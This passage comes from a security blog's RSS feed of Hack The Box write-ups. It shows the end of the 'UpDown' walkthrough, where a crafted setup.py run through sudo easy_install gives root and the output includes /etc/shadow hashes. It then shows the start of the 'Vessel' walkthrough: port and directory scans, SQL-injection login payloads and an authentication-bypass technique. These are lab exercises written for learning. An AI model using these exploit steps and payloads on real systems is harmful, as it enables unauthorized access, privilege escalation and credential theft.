font-style: inherit;">tty</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> &gt;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tty</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> 2&gt;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tty</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">')"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$TF</span>/setup.py</span>
<span id="cb20-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer@updown:/dev/shm$</span> sudo /usr/local/bin/easy_install <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$TF</span></span>
<span id="cb20-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WARNING:</span> The easy_install command is deprecated and will be removed in a future version.</span>
<span id="cb20-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Processing</span> tmp.i7LFwunRkU</span>
<span id="cb20-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Writing</span> /tmp/tmp.i7LFwunRkU/setup.cfg</span>
<span id="cb20-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Running</span> setup.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-q</span> bdist_egg <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dist-dir</span> /tmp/tmp.i7LFwunRkU/egg-dist-tmp-2bXqH_</span>
<span id="cb20-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># id</span></span>
<span id="cb20-9"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb20-10"></span>
<span id="cb20-11"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># cat /root/root.txt</span></span>
<span id="cb20-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">72fa86fbc9173578b5df7f17dd9d3933</span></span>
<span id="cb20-13"></span>
<span id="cb20-14"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># cat /etc/shadow </span></span>
<span id="cb20-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$3</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5UwqDmGM31K3z1O</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$EV0yHaLbvEqQ1YfxHOl4fMFHnR0O0Lo7RSnFGpYdfUwBmec0</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/5JWenL6GLivYgeka8Z4XyYW2UhWOV5UOdK0w.:19165:0:99999:7:::</span></span>
<span id="cb20-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$LkPh3nNMEVO</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.zmIc</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$I</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/j67KSo1n7pR.fzcMfH/hc/8EYISX8JUtDpoc7iMIiYEhX4bgVXPV4L6Gam3AvxMd46wh5XTulsxbpy9ezLf/:19165:0:99999:7:::</span></span></code></pre></div>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>git</category>
  <category>header</category>
  <category>file upload</category>
  <category>phar</category>
  <category>proc_open</category>
  <category>python</category>
  <guid>https://exploit.se/posts/2022-09-07-htb-writeup-updown/2022-09-07-htb-writeup-updown.html</guid>
  <pubDate>Wed, 07 Sep 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Vessel - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-09-02-htb-writeup-vessel/2022-09-02-htb-writeup-vessel.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.178</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> Nmap 7.92 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://nmap.org</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> 2022-08-29 09:37 CEST</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nmap</span> scan report for 10.10.11.178</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> is up <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.031s</span> latency<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> shown: 65533 closed tcp ports <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn-refused</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-9"></span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> 10.10.11.178</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    Apache httpd 2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Vessel</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-trane-info:</span> Problem with XML parsing of /evox/about</span>
<span id="cb1-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel dirb http://10.10.11.178</span>
<span id="cb2-2"></span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">START_TIME:</span> Mon Aug 29 09:39:29 2022</span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">URL_BASE:</span> http://10.10.11.178/</span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WORDLIST_FILES:</span> /usr/share/dirb/wordlists/common.txt</span>
<span id="cb2-6"></span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----------------</span></span>
<span id="cb2-8"></span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GENERATED</span> WORDS: 4612                                                          </span>
<span id="cb2-10"></span>
<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----</span> Scanning URL: http://10.10.11.178/ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span></span>
<span id="cb2-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/401 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:2400</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/404 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:2393</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/500 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:2335</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/admin <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:302</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:28</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/Admin <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:302</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:28</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/ADMIN <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:302</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:28</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                               </span>
<span id="cb2-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/charts <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:302</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:26</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                              </span>
<span id="cb2-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/css <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:301</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                                </span>
<span id="cb2-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/dev <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:301</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                                </span>
<span id="cb2-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/img <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:301</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:173</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                                </span>
<span id="cb2-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/js <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:301</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:171</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                                 </span>
<span id="cb2-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/login <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:4213</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                             </span>
<span id="cb2-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/Login <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:4213</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                             </span>
<span id="cb2-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/logout <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:302</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:28</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                              </span>
<span id="cb2-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/register <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:5830</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                          </span>
<span id="cb2-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.10.11.178/server-status <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:403</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:277</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>  </span></code></pre></div>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://vessel.htb</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://vessel.htb</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.2s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb3-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Apache,</span> 2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Google</span> Font API,  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Font</span> scripts<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lightbox,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">JavaScript</span> libraries<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Express,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> frameworks, Web servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Node.js,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel ffuf <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> /usr/share/wordlists/dirb/big.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> http://vessel.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Host: FUZZ.vessel.htb"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-fw</span> 5599</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span></code></pre></div>
<p>Visiting port 80 we find <code>vessel.htb</code> in the footer, add it to <code>/etc/hosts</code>.</p>
<p>Trying to create an account we get the response <em>“Currently not available!”</em>, and looking in the HTTP POST the body is empty.</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel01.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel02.png" class="img-fluid"></p>
<p>Same thing goes for the Password Recovery function - <em>“Currently not available!”</em> and no data in the POST body.</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel03.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel04.png" class="img-fluid"></p>
<p>Changing focus to the login function. Testing different SQL Injection payloads we get the response <em>“Wrong credentials! Try Again!”</em> several times, example:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Request:</span> username=admin<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' or '</span>1<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'='</span>1<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'#&amp;password=pass'</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Respone:</span> Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!</span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Request:</span> username=admin<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" or "</span>1<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"="</span>1<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/*&amp;password=pass'</span></span>
<span id="cb5-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Response: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!</span></span>
<span id="cb5-6"></span>
<span id="cb5-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Request: username=admin"</span> or <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span>=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1"</span>--<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">password</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>pass<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span></span>
<span id="cb5-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Response:Wrong credentials! Try Again!,Wrong credentials! Try Again!</span></span></code></pre></div>
<p>Googling about nodejs sql injection I come across <a href="https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4">this post</a> explaining a authentication bypass technique. <strong>TLDR;</strong></p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">username</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>admin<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">password</span><span class="op" style="color: #5E5E5E;
background-color: null;
